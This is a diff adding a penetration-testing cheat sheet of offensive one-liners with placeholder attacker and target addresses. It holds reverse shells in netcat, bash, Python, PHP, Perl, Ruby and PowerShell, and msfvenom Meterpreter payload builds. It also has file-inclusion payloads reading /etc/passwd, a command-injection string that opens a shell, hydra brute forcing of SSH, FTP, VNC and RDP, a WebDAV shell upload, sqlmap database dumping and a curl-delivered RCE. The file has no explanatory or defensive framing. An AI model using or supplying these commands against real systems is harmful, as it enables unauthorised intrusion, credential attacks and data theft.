@@ -1,0 +1,64 @@
+#### Netcat Reverse Shell
+nc -e /bin/sh $attacker_ip $attacker_port
+nc -e /bin/bash $attacker_ip $attacker_port
+/bin/sh | nc $attacker_ip $attacker_port
+/bin/bash | nc $attacker_ip $attacker_port
+
+#### Bash Reverse Shell
+bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1
+
+#### Python Reverse Shell
+python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$attacker_ip",$attacker_port)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$attacker_ip",$attacker_port)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+
+#### PHP Reverse Shell
+php -r '$sock=fsockopen("$attacker_ip",$attacker_port);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("$attacker_ip",$attacker_port);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+
+#### Perl Reverse Shell
+perl -e 'use Socket;$i="$attacker_ip";$p=$attacker_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+#### Ruby Reverse Shell
+ruby -rsocket -e'f=TCPSocket.open("$attacker_ip",$attacker_port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+#### PowerShell Reverse Shell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("$attacker_ip",$attacker_port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+#### Meterpreter Reverse Shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$attacker_ip LPORT=$attacker_port -f exe > data/shell.exe
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$attacker_ip LPORT=$attacker_port -f elf > data/shell.elf
+msfvenom -p php/meterpreter_reverse_tcp LHOST=$attacker_ip LPORT=$attacker_port -f raw > data/shell.php
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$attacker_ip LPORT=$attacker_port -f raw > data/shell.jsp
+
+#### Local File Inclusion (LFI) Payload
+http://$target_ip/index.php?page=../../../../etc/passwd
+
+#### Remote File Inclusion (RFI) Payload
+http://$target_ip/index.php?page=http://$attacker_ip/shell.txt
+
+#### Command Injection Payload
+; nc $attacker_ip $attacker_port -e /bin/sh ;
+
+#### SSH Brute Force
+hydra -l root -P data/passwords.txt ssh://$target_ip
+
+#### FTP Brute Force
+hydra -l anonymous -P data/passwords.txt ftp://$target_ip
+
+#### VNC Brute Force
+hydra -P data/passwords.txt vnc://$target_ip
+
+#### RDP Brute Force
+hydra -t 1 -V -f -l administrator -P data/passwords.txt rdp://$target_ip
+
+#### WebDAV Exploit
+cadaver http://$target_ip/webdav
+put data/shell.php
+
+#### Exploiting Web Application Vulnerabilities
+sqlmap -u "http://$target_ip/vulnerable.php?id=1" --dbs
+sqlmap -u "http://$target_ip/vulnerable.php?id=1" -D $database_name --tables
+sqlmap -u "http://$target_ip/vulnerable.php?id=1" -D $database_name -T $table_name --dump
+
+#### Exploiting Remote Code Execution
+curl -X POST -d "cmd=nc $attacker_ip $attacker_port -e /bin/sh" http://$target_ip/vulnerable_endpoint
